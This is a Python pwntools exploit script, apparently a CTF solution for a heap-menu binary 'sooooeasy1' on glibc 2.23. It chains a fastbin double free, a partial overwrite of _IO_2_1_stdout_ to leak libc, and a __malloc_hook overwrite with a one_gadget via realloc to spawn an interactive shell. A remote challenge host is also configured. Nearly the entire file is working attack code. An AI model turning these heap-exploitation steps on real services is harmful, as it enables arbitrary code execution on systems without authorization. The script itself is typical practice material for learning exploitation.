#! /usr/bin/env python3
from pwn import *

def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice : ')

def add(size, name, message):
    eat()
    p.sendline('1')
    p.recvuntil('your name: ')
    p.sendline(str(size))
    p.recvuntil('Your name:')
    p.send(name)
    p.recvuntil('Your message:')
    p.sendline(message)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil("mumber's index:")
    p.sendline(str(idx))

while True:
    try:
        arch = 64
        challenge = './sooooeasy1'

        context.os='linux'
        context.log_level = 'debug'
        if arch==64:
            context.arch='amd64'
        if arch==32:
            context.arch='i386'
        context.terminal = ['tmux', 'splitw', '-h']
        elf = ELF(challenge)
        libc = ELF('libc-2.23.so')

        local = 1
        if local:
            p = process(challenge)
        else:
            p = remote('chuj.top', '53178')
        
        _IO_2_1_stdout_ = libc.symbols["_IO_2_1_stdout_"] & 0xffff
        log.success('_IO_2_1_stdout_: ' + hex(_IO_2_1_stdout_))
        
        add(0x60, '1', 'mess')#* 0
        add(0x90, '1', 'mess')#* 1
        add(0x60, '1', 'mess')#* 2
        
        dele(1)
        # add(0x60, p16(_IO_2_1_stdout_), 'mess')#* 3
        
        add(0x60, p16(_IO_2_1_stdout_-0x43), 'mess')#* 3
        

        dele(0)
        dele(2)
        dele(0)
        

        add(0x60, p8(0), 'mess')#* 4
        

        add(0x60, '1', 'mess')#* 5
        add(0x60, '1', 'mess')#* 6
        add(0x60, '1', 'mess')#* 7
        # debug()
        # add(0x60, , )#* 7
        eat()#* 7
        p.sendline('1')
        p.recvuntil('your name: ')
        p.sendline(str(0x60))
        p.recvuntil('Your name:')
        p.send(p64(0)*5+3*b'\x00'+p64(0)+p64(0xfbad1800)+p64(0)*3+b'\x58')
        
        libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - libc.symbols["_IO_2_1_stdout_"] - 131
        log.success('libc.address: ' + hex(libc.address))
        
        p.recvuntil('Your message:')
        p.sendline('mess')
        
        malloc_hook = libc.symbols["__malloc_hook"]
        log.success("malloc_hook: "+hex(malloc_hook))
        
        one_array = [0x45216,0x4526a,0xf02a4,0xf1147]
        one_gadgets = one_array[3] + libc.address
        
        realloc_addr = libc.symbols["realloc"]
        log.success("realloc_addr: "+hex(realloc_addr))
        
        dele(0)
        dele(2)
        dele(0)
        # debug()
        add(0x60, p64(malloc_hook-0x23), 'mess')#* 8
        add(0x60, p64(malloc_hook-0x23), 'mess')#* 9
        add(0x60, p64(malloc_hook-0x23), 'mess')#* 10
        
        add(0x60, b'\x00'*0xb+p64(one_gadgets)+p64(realloc_addr+0x6), 'mess')#* 11
        # debug()
        eat()#* 12
        p.sendline('1')

    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break